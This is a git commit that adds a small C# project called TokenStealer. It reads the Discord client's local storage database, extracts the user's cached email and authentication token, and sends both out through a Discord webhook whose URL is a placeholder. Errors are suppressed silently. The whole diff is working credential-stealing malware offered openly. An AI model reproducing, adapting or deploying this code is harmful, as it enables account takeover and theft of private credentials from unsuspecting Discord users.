ab01e1f7152799d4bcd1795ae740547c30077fed
iLinked-is-a-meme <43618132+iLinked-is-a-meme@users.noreply.github.com>
2018-12-06 17:18:32 +0100

    Add files via upload

---
+++ TokenStealer/TokenStealer/Program.cs
@@ -0,0 +1,59 @@
+﻿using System;
+using System.Text;
+using System.Data.SQLite;
+using System.Data;
+
+namespace TokenStealer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            try
+            {
+                SQLiteConnection connection = new SQLiteConnection($"Data Source={Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}" + @"\discord\Local Storage\https_discordapp.com_0.localstorage;Version=3;"); //opens up a connection with the Discord SQLite database
+                connection.Open(); //opens the connection
+
+                //creates a webhook (i didn't come up with this code btw), and sets the properties
+                Webhook hook = new Webhook();
+                hook.Name = "webhook name";
+                hook.URL = "webhook URL";
+                hook.Pfp = "profile picture URL";
+
+                hook.SendMsg($"email: {ExtractInfo(connection, "SELECT * FROM ItemTable", "email_cache")}\ntoken: {ExtractInfo(connection, "SELECT * FROM ItemTable", "token")}"); //sends the information
+
+                connection.Close(); //closes the connection with the database
+            }
+            catch (Exception) { }
+        }
+
+        private static string ExtractInfo(SQLiteConnection connection, string cmd, string key)
+        {
+            //create a dataset and table for the data
+            DataSet set = new DataSet();
+            DataTable dTab = new DataTable();
+            SQLiteDataAdapter adapter = new SQLiteDataAdapter(cmd, connection); //get the information
+            //set the information
+            set.Reset();
+            adapter.Fill(set);
+            dTab = set.Tables[0];
+
+            //return the decoded information
+            return Encoding.Unicode.GetString((byte[])GetRow(key, dTab.Rows).ItemArray[1]);
+        }
+
+        private static DataRow GetRow(string key, DataRowCollection rows)
+        {
+            //loops through the rows, and looks for the row with the key
+            DataRow result = null;
+            foreach (DataRow row in rows)
+            {
+                if (row.ItemArray[0].ToString() == key)
+                    result = row;
+            }
+
+            //return the row
+            return result;
+        }
+    }
+}
---
+++ TokenStealer/TokenStealer/Webhook.cs
@@ -0,0 +1,34 @@
+﻿using System;
+using System.Net;
+using System.Collections.Specialized;
+
+public class Webhook : IDisposable
+{
+    private WebClient client;
+    public string URL { get; set; }
+    public string Name { get; set; }
+    public string Pfp { get; set; }
+
+    public Webhook()
+    {
+        client = new WebClient();
+    }
+
+    public void SendMsg(string msg)
+    {
+        //creates a collection of all the information that is needed for sending a message with it
+        NameValueCollection collection = new NameValueCollection();
+
+        collection.Add("username", Name);
+        collection.Add("avatar_url", Pfp);
+        collection.Add("content", msg);
+
+        //upload the values, which will in this case send the message
+        client.UploadValues(URL, collection);
+    }
+
+    public void Dispose()
+    {
+        client.Dispose();
+    }
+}
